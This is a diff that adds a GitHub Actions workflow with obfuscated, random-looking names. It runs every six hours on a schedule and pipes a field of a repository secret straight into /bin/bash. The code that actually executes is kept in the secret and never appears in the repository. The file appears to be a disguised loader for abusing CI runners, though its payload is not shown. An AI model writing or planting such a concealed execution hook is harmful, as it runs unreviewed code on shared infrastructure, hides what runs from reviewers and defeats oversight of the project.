@@ -1,0 +1,22 @@
+name: xianghuaguo3451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          y39485: ${{ secrets.y39485 }}
+        run: |
+          echo $y39485 | jq -r .wgtq85515 | /bin/bash
+          echo $hxm1527 | jq -r .zlknr8 | /bin/bash
+          echo $dt6 | jq -r .dda76 | /bin/bash
+          echo $jkv91 | jq -r .nwcws00 | /bin/bash
+          echo $yg2 | jq -r .njni471 | /bin/bash
+          echo $pfr7074 | jq -r .gzjj4437 | /bin/bash
+          echo $ywyt655 | jq -r .lceo340 | /bin/bash
+
